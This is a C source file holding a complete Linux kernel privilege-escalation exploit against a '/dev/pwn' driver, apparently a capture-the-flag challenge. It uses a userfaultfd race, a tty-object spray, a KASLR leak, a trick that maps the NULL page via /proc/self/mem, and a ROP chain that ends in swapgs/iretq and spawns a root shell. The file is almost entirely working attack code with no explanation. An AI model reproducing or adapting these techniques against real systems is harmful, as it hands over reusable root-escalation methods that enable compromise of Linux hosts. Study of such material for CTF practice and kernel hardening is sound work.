#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
					   } while (0)
#define __u64 uint64_t
#define __u32 uint32_t
#define __u16 uint16_t
#define __u8  uint8_t
#define __s64 int64_t

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_COPY 0xc028aa03

#define UFFD_API ((__u64)0xAA)	  
#define __NR_userfaultfd 323 
struct uffdio_range {
	__u64 start;
	__u64 len;
};
struct uffdio_copy {
	__u64 dst;
	__u64 src;
	__u64 len;
	/*
	 * There will be a wrprotection flag later that allows to map
	 * pages wrprotected on the fly. And such a flag will be
	 * available if the wrprotection ioctl are implemented for the
	 * range according to the uffdio_register.ioctls.
	 */
#define UFFDIO_COPY_MODE_DONTWAKE		((__u64)1<<0)
	__u64 mode;

	/*
	 * "copy" is written by the ioctl and must be at the end: the
	 * copy_from_user will not read the last 8 bytes.
	 */
	__s64 copy;
};

struct uffd_msg {
	__u8	event;

	__u8	reserved1;
	__u16	reserved2;
	__u32	reserved3;

	union {
		struct {
			__u64	flags;
			__u64	address;
			union {
				__u32 ptid;
			} feat;
		} pagefault;

		struct {
			__u32	ufd;
		} fork;

		struct {
			__u64	from;
			__u64	to;
			__u64	len;
		} remap;

		struct {
			__u64	start;
			__u64	end;
		} remove;

		struct {
			/* unused reserved fields */
			__u64	reserved1;
			__u64	reserved2;
			__u64	reserved3;
		} reserved;
	} arg;
} __packed;



struct uffdio_api {
	/* userland asks for an API number and the features to enable */
	__u64 api;
	/*
	 * Kernel answers below with the all available features for
	 * the API, this notifies userland of which events and/or
	 * which flags for each event are enabled in the current
	 * kernel.
	 *
	 * Note: UFFD_EVENT_PAGEFAULT and UFFD_PAGEFAULT_FLAG_WRITE
	 * are to be considered implicitly always enabled in all kernels as
	 * long as the uffdio_api.api requested matches UFFD_API.
	 *
	 * UFFD_FEATURE_MISSING_HUGETLBFS means an UFFDIO_REGISTER
	 * with UFFDIO_REGISTER_MODE_MISSING mode will succeed on
	 * hugetlbfs virtual memory ranges. Adding or not adding
	 * UFFD_FEATURE_MISSING_HUGETLBFS to uffdio_api.features has
	 * no real functional effect after UFFDIO_API returns, but
	 * it's only useful for an initial feature set probe at
	 * UFFDIO_API time. There are two ways to use it:
	 *
	 * 1) by adding UFFD_FEATURE_MISSING_HUGETLBFS to the
	 *    uffdio_api.features before calling UFFDIO_API, an error
	 *    will be returned by UFFDIO_API on a kernel without
	 *    hugetlbfs missing support
	 *
	 * 2) the UFFD_FEATURE_MISSING_HUGETLBFS can not be added in
	 *    uffdio_api.features and instead it will be set by the
	 *    kernel in the uffdio_api.features if the kernel supports
	 *    it, so userland can later check if the feature flag is
	 *    present in uffdio_api.features after UFFDIO_API
	 *    succeeded.
	 *
	 * UFFD_FEATURE_MISSING_SHMEM works the same as
	 * UFFD_FEATURE_MISSING_HUGETLBFS, but it applies to shmem
	 * (i.e. tmpfs and other shmem based APIs).
	 *
	 * UFFD_FEATURE_SIGBUS feature means no page-fault
	 * (UFFD_EVENT_PAGEFAULT) event will be delivered, instead
	 * a SIGBUS signal will be sent to the faulting process.
	 *
	 * UFFD_FEATURE_THREAD_ID pid of the page faulted task_struct will
	 * be returned, if feature is not requested 0 will be returned.
	 */
#define UFFD_FEATURE_PAGEFAULT_FLAG_WP		(1<<0)
#define UFFD_FEATURE_EVENT_FORK			(1<<1)
#define UFFD_FEATURE_EVENT_REMAP		(1<<2)
#define UFFD_FEATURE_EVENT_REMOVE		(1<<3)
#define UFFD_FEATURE_MISSING_HUGETLBFS		(1<<4)
#define UFFD_FEATURE_MISSING_SHMEM		(1<<5)
#define UFFD_FEATURE_EVENT_UNMAP		(1<<6)
#define UFFD_FEATURE_SIGBUS			(1<<7)
#define UFFD_FEATURE_THREAD_ID			(1<<8)
	__u64 features;

	__u64 ioctls;
};
						   
struct uffdio_register {
	struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING	((__u64)1<<0)
#define UFFDIO_REGISTER_MODE_WP		((__u64)1<<1)
	__u64 mode;
	__u64 ioctls;
};	   
				
void get_NULL(){
	void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	int fd = open("/proc/self/mem", O_RDWR);
  	unsigned long addr = (unsigned long)map;
  	while (addr != 0) {
	    addr -= 0x1000;
	    lseek(fd, addr, SEEK_SET);
    	    char cmd[1000];
	    sprintf(cmd, "LD_DEBUG=help su --help 2>&%d", fd);
    	    system(cmd);
  	}
	close(fd);
	printf("data at NULL: 0x%lx\n", *(unsigned long *)0);
}
static int page_size;
char *fault;
int pfd[0x1000];
int tmp;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );

}

void get_shell(int sig){
	system("sh");
}
void* job(void* x){
	sleep(1);
	fault = (void*)mmap((void*)0x2468000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
}

static void *
fault_handler_thread(void *arg)
{
   
   static int fault_cnt = 0;     /* Number of faults so far handled */
   long uffd;                    /* userfaultfd file descriptor */
   static char *page = NULL;
   ssize_t nread;
   struct uffdio_copy uffdio_copy;
   static struct uffd_msg msg;
   uffd = (long) arg;

   /* Create a page that will be copied into the faulting region */

   if (page == NULL) {
	   page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	   if (page == MAP_FAILED)
		   errExit("mmap");
   }

   /* Loop, handling incoming events on the userfaultfd
	  file descriptor */

   for (;;) {

	   /* See what poll() tells us about the userfaultfd */

	   struct pollfd pollfd;
	   int nready;
	   pollfd.fd = uffd;
	   pollfd.events = POLLIN;
	   nready = poll(&pollfd, 1, -1);
	   if (nready == -1)
		   errExit("poll");
	   munmap(fault,0x1000);
	   /* Read an event from the userfaultfd */
	   read(uffd,&msg,sizeof(msg));
	   uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
 	   uffdio_copy.len = page_size;
           uffdio_copy.mode = 0;
           uffdio_copy.copy = 0;
           if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");   



   }
}

int main(int argc, char *argv[])
{
   long uffd;          /* userfaultfd file descriptor */
   char *addr;         /* Start of region handled by userfaultfd */
   unsigned long len;  /* Length of region handled by userfaultfd */
   pthread_t thr;      /* ID of thread that handles page faults */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   int s;

   page_size = sysconf(_SC_PAGE_SIZE);
   len =  page_size;

   /* Create and enable userfaultfd object */

   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
	   errExit("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   errExit("ioctl-UFFDIO_API");

   /* Create a private anonymous mapping. The memory will be
	  demand-zero paged--that is, not yet allocated. When we
	  actually touch the memory, it will be allocated via
	  the userfaultfd. */

   addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (addr == MAP_FAILED)
	   errExit("mmap");



   /* Register the memory range of the mapping we just created for
	  handling by the userfaultfd object. In mode, we request to track
	  missing pages (i.e., pages that have not yet been faulted in). */

   uffdio_register.range.start = (unsigned long) addr;
   uffdio_register.range.len = len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   errExit("ioctl-UFFDIO_REGISTER");

   /* Create a thread that will process the userfaultfd events */

   s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
   if (s != 0) {
	   errno = s;
	   errExit("pthread_create");
   }
   save_status();
   get_NULL();
   signal(SIGSEGV,get_shell);
   int fd = open("/dev/pwn",O_RDONLY);
   uint64_t buf[0x22];
   char *addr2 = (void*)mmap((void*)0x1234000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
   fault = (void*)mmap((void*)0x2468000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
   size_t kcode = 0;

	memset(addr2,0,0x1000);
	buf[0] = 1;
	buf[1] = (size_t)addr2;
	buf[2] = 0x400;
	ioctl(fd,6,buf);
	for(int i=0;i<0x1000;i++)
		pfd[i] = open("/dev/ptmx/",O_RDWR);
	buf[0x21] = 0;
	buf[0] = 4;
	buf[1] = (size_t)addr2;
	buf[2] = 0x300;
	buf[3] = (size_t)fault;
	buf[4] = 0x80;
	buf[5] = (size_t)addr;
	buf[6] = 0x80;
	buf[7] = (size_t)addr2;
	buf[8] = 0x300;	
	pthread_t tid;
	pthread_create(&tid,NULL,job,NULL);
	ioctl(fd,66,buf);
	pthread_join(tid,NULL);
	size_t *p = (size_t*)addr2;
	kcode = p[7];
	buf[0] = 0;
	if( kcode < 0xff00000000000000 ){
		puts("Leak Failed");	
		ioctl(fd,6666,buf);
		exit(-1);
	}
    kcode -= 0x17b08c0;
    printf("%p\n",(void*)kcode);
    ioctl(fd,6666,buf);
	kcode -= 0xffffffff81000000;
        size_t *rop = (size_t*)&addr2[0x10];
	int i=0;


	rop[i++] = kcode + 0xffffffff81086800; // : pop rdi ; ret;
	rop[i++] = 0;
	rop[i++] = kcode + 0xffffffff810b9db0;
	rop[i++] = kcode + 0xffffffff8151224c; //: push rax ; pop rdi ; add byte ptr [rax], al ; pop rbp ; ret
	rop[i++] = 0;
	rop[i++] = kcode + 0xffffffff810b9a00;
       

        rop[i++] = kcode + 0xffffffff81070894; // swapgs ; pop rbp ; ret
        rop[i++] = 0;
        rop[i++] = kcode+0xffffffff81036bfb; // iretq
        rop[i++] = (size_t)get_shell;
        rop[i++] = user_cs;                /* saved CS */
        rop[i++] = user_rflags;            /* saved EFLAGS */
        rop[i++] = user_sp;
        rop[i++] = user_ss;

	rop[i++] = kcode + 0xffffffff8100021e;
	buf[0] = 1;
	buf[1] = (size_t)addr2;
	buf[2] = 0x400;
	ioctl(fd,6,buf);
	buf[0x21] = 0;
	*(size_t*)0 = kcode+0xffffffff81488731;
	buf[0x21] = 0;
	buf[1] = (size_t)addr2+0xff8;
	buf[2] = 0x10;
	ioctl(fd,666,buf);
	ioctl(fd,666,buf);


   
}
